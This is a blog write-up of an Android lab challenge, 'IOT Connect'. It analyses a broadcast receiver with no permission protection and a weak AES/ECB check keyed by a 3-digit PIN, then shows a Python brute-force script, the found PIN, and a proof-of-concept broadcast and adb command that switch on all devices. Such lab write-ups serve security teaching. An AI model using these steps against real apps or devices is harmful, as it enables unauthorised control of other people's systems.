+++
date = '2025-07-30T00:55:36+03:00'
draft = false
title = 'IOT Connect'
+++

***Android Broadcast Receiver Challenge***

## 🎯 **Goal**

> This challenge focuses on exploiting a security flaw related to the **Broadcast Receiver** in the **IOT Connect** application.  The flaw allows unauthorized users to activate the **master switch**, which turns on all connected devices.  
> The goal is to send a broadcast in a way that only authenticated users should be able to trigger the master switch.

## Analysis
#### Exported from manifest 
##### Activities
1. **LoginActivity**
   - Entry point of the app (MAIN/LAUNCHER intent filter)

1. **SignupActivity**  

2. **MainActivity**  

##### Broadcast Receivers
1. **MasterReceiver**
   - Handles custom "MASTER_ON" broadcasts
   - No permission protection

2. **ProfileInstallReceiver** (AndroidX component)
   - Handles profile installer operations (INSTALL_PROFILE, SKIP_FILE, etc.)
   - Protected by android.permission.DUMP (signature-level permission)
   - Exported but with permission requirement

### Moving on 

Now after playing around with the app we understand that:
1. you can create and interact with the app as new user
2. new users (guests) can't try to run master key even if you have the correct 3-digit pin

![[Pasted image 20250715015025.png]]


when searching for `MasterReceiver` receiver we find it dynamically implemented  but not in a class names *MasterReceiver* but in *CommunicationManager*  and that will cause us a minor problem in the future but now lets see what we have

### Code Deep Dive

```java
 public final BroadcastReceiver initialize(Context context) {
        masterReceiver = new BroadcastReceiver() { 
            public void onReceive(Context context2, Intent intent) {
                if (Intrinsics.areEqual(intent != null ? intent.getAction() : null, "MASTER_ON")) {
                    int key = intent.getIntExtra("key", 0);
                    if (context2 != null) {
                        if (Checker.INSTANCE.check_key(key)) {
                            CommunicationManager.INSTANCE.turnOnAllDevices(context2);
                            Toast.makeText(context2, "All devices are turned on", 1).show();
                        } else {
                            Toast.makeText(context2, "Wrong PIN!!", 1).show();
                        }
                    }
                }
            }
        };
        BroadcastReceiver broadcastReceiver = masterReceiver;
        if (broadcastReceiver == null) {
            Intrinsics.throwUninitializedPropertyAccessException("masterReceiver");
            broadcastReceiver = null;
        }
        context.registerReceiver(broadcastReceiver, new IntentFilter("MASTER_ON"));
        BroadcastReceiver broadcastReceiver2 = masterReceiver;
        if (broadcastReceiver2 != null) {
            return broadcastReceiver2;
        }
        Intrinsics.throwUninitializedPropertyAccessException("masterReceiver");
        return null;

```

so the class has a  `masterReceiver` that will check for action: `MASTER_ON` as we know but it also wants aother requirement  a `key` . going deeper and seeing  this method `Checker.INSTANCE.check_key()` we find this lovely AES implementation    

```java
public final class Checker {
    public static final Checker INSTANCE = new Checker();
    private static final String algorithm = "AES";
    private static final String ds = "OSnaALIWUkpOziVAMycaZQ==";

    private Checker() {
    }

    public final boolean check_key(int key) {
        try {
            return Intrinsics.areEqual(decrypt(ds, key), "master_on");
        } catch (BadPaddingException e) {
            return false;
        }
    }

    public final String decrypt(String ds2, int key) {
        Intrinsics.checkNotNullParameter(ds2, "ds");
        SecretKeySpec secretKey = generateKey(key);
        Cipher cipher = Cipher.getInstance(algorithm + "/ECB/PKCS5Padding");
        cipher.init(2, secretKey);
        if (Build.VERSION.SDK_INT >= 26) {
            byte[] decryptedBytes = cipher.doFinal(Base64.getDecoder().decode(ds2));
            Intrinsics.checkNotNull(decryptedBytes);
            return new String(decryptedBytes, Charsets.UTF_8);
        }
        throw new UnsupportedOperationException("VERSION.SDK_INT < O");
    }

    private final SecretKeySpec generateKey(int staticKey) {
        byte[] keyBytes = new byte[16];
        byte[] staticKeyBytes = String.valueOf(staticKey).getBytes(Charsets.UTF_8);
        Intrinsics.checkNotNullExpressionValue(staticKeyBytes, "getBytes(...)");
        System.arraycopy(staticKeyBytes, 0, keyBytes, 0, Math.min(staticKeyBytes.length, keyBytes.length));
        return new SecretKeySpec(keyBytes, algorithm);
    }
}
```


This code implements a simple encryption checker that checks if the provided integer key can correctly decrypt a hardcoded ciphertext to produce the string "master_on". sooo
### **In short**
1. **Algorithm & Mode**: Uses **AES/ECB/PKCS5Padding**
2. **Hardcoded Data**: 
   - Ciphertext (`ds`): `"OSnaALIWUkpOziVAMycaZQ=="` (Base64-encoded)
   - Expected plaintext: `"master_on"`

and with that we have all the signs that tells us to brute force it 

#### **Code Flow**
1. **`check_key(int key)`**:
   - Takes an integer key
   - Calls `decrypt()` with the hardcoded ciphertext (`ds`) and the key
   - Compares the decrypted result with `"master_on"`

2. **`decrypt(String ds2, int key)`**:
   - Generates an AES key from the integer key (`generateKey(key)`)
   - Initializes a cipher in **decryption mode (2 = `Cipher.DECRYPT_MODE`)**
   - Decodes the Base64 ciphertext and decrypts it using AES/ECB
   - Returns the decrypted string (UTF-8)

3. **`generateKey(int staticKey)`**:
   - Converts the integer key to a UTF-8 byte array
   - Copies it into a **16-byte key** (AES-128 requires 128-bit keys)
   - If the key is shorter than 16 bytes, the remaining bytes are `0` (due to `System.arraycopy`)

### The problem
1. **Weak Cryptography**
   - Uses AES/ECB mode (deterministic)
   - 3-digit PIN → 1000 possible keys (bruteforceable)
   - Hardcoded ciphertext (`OSnaALIWUkpOziVAMycaZQ==`)

2. **Insecure Broadcast**
   - No permission protection
   - No sender verification

### Exploitation
After some time like figuring out how to actually decode AES in python ...... FINALY
i ended up with this string 

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64

cipherTxT = "OSnaALIWUkpOziVAMycaZQ=="  # Base64-encoded ciphertext
PlainTxT = "master_on"

def num_gen():
    arr = []
    digits = 3  # Number of digits 
    format_str = f"{{:0{digits}d}}"

    for number in range(0, 1000):
        arr.append(format_str.format(number))
    return arr

def generate_key(pin):
    pin_str = str(pin)
    key_bytes = pin_str.encode('utf-8').ljust(16, b'\x00')[:16]  # Pad to 16 bytes
    return key_bytes

def decrypt(ciphertext, plaintext):
    ciphertext = base64.b64decode(cipherTxT)  
    
    for pin in range(0,1000):
        real_pins = num_gen()
        key = generate_key(real_pins[pin])
        cipher = AES.new(key, AES.MODE_ECB)
        
        try:
            decrypted = cipher.decrypt(ciphertext)
            decrypted = unpad(decrypted, AES.block_size)
            decrypted_str = decrypted.decode('utf-8')

            if decrypted_str == plaintext:
                print(f"\nSUCCESS! Found PIN: {pin:03d}")
                print(f"Decrypted text: '{decrypted_str}'")
                print(f"Key used: {key.hex()}")
                return pin
        except Exception as e:
            continue  
        
    print("\nNo matching PIN found")
    return None
            

if __name__ == "__main__":
    found_pin = decrypt(cipherTxT, PlainTxT)

    if found_pin is not None:
        print("YaY")
```

i created the code so that if the pin changes to like 5 digits it will only need small edits and in the future i can add multi threading to speed things up 

**AND guess what !**
```txt
SUCCESS! Found PIN: 345
Decrypted text: 'master_on'
Key used: 33343500000000000000000000000000
YaY
```

now what was i doing again ????  oh yeah back to the receiver

so i will try to send broadcast with
- pin = 345
- action = `MASTER_ON`

*(FYI i forgot since this a dynamically registered receiver i wont need to specify class and package .... since the  class name used didn't even exist .... and yes i did this lab at like 3am and i need to sleep )*

And since we don't need to specify class we can just fire our Poc and see what happens 
```java
Intent intent = new Intent();  
intent.setAction("MASTER_ON");  
intent.putExtra("key", 345);  
  
sendBroadcast(intent);
```

or adb

```bash
adb shell am broadcast -a "MASTER_ON" --ei key 345            
```

AAAAAAAAAAANd  done
using logcat to verify that we actually succeeded an no error occurred in the background is the best feeling in the world   

![[Pasted image 20250715045535.png]]

> **Note:** If you are in the setup activity (where you on/off things) the solution wont be applied to the UI unless you returned and clicked the button again


Thx for reading 
***JOYBOY*** out
